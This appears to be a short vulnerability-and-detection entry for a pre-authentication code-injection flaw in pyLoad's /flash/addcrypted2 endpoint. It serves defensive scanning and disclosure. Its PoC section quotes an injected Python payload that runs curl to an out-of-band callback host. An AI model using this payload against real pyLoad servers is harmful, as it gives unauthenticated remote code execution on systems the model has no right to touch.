## Vulnerability
PyLoad is vulnerable to pre-authentication remote code execution via code injection in the GitHub repository pyload/pyload prior to 0.5.0b3.dev31. The flaw is present in the `/flash/addcrypted2` endpoint and can be triggered without any credentials.

Successful exploitation allows unauthenticated remote attackers to execute arbitrary code on the target system.  
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8)  
CWE-94 (Code Injection)

## PoC / Detection
Classification: rce

The template sends a GET request to `/flash/addcrypted2` followed by a POST request to the same endpoint. The POST body contains a crafted `jk` parameter that injects Python code (`pyimport os;os.system("curl {{interactsh-url}}")`) inside a JDownloader-style crypted payload. Detection confirms success when the first response body contains the word "JDownloader" and an out-of-band DNS callback is received on the interactsh server.
